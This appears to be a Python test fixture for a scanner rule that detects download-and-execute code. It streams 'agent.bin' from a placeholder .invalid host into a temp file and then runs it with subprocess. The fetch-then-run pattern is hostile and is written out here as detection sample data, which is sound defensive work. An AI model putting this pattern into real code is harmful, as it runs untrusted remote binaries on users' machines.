"""PHX-DRP-002 positive (ADR-031): a streamed download written chunk by chunk, then run.

The bytes reach the file through `r.iter_content()`, a method call on the response, and the
file's path reaches `subprocess`. Inert: the host is under `.invalid`.
"""
import os
import subprocess
import tempfile

import requests


def fetch_and_start():
    r = requests.get("https://cdn.example.invalid/agent.bin", stream=True)
    path = os.path.join(tempfile.gettempdir(), "agent.bin")
    with open(path, "wb") as fh:
        for chunk in r.iter_content(chunk_size=8192):
            fh.write(chunk)
    subprocess.Popen([path])
